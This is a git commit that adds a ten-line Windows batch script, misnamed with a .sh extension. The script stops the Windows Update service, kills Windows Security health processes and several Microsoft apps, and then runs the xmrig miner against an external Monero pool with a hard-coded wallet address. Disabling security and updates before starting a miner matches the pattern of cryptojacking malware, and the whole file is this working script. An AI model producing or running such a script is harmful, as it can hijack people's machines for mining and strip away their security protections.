098a4fd2177fad318e10f6e32e1a0358ff6dcc12
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-04 18:54:02 -0300

    Create sh0401.sh

---
+++ sh0401.sh
@@ -0,0 +1,10 @@
+@echo off
+net stop WUAUSERV
+taskkill /IM OneDrive.exe
+taskkill /IM SecurityHealthSystray.exe
+taskkill /IM SecurityHealthService.exe
+taskkill /IM ONENOTEM.exe
+taskkill /IM Teams.exe
+cd /d "%~dp0"
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Reiniciado-04-01 -p x -t 8
+pause 
